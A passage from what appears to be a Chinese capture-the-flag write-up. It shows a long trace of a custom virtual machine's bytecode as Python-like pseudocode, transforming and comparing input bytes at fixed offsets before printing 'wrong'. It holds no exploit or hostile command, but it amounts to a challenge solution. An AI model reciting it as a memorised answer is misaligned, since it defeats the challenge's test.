('Read code, offset:', '130')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '130')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '131')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '131')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '132')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '132')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '133')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '133')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '134')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '134')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '135')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '135')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '136')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '136')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '137')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '137')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">0</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '138')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><p>上面是在 <code>buf[3] != 0</code> 的时候，输出 wrong 的情况，如果在这个条件判断中都正确的话，会产生以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">buf[<span class="number">0</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '138')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '130')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '139')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '131')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '140')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '132')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '141')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '133')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '142')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '134')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '143')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '135')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '144')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line">buf[<span class="number">3</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">2</span>] -= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">2</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 90</span></span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '136')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '145')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = 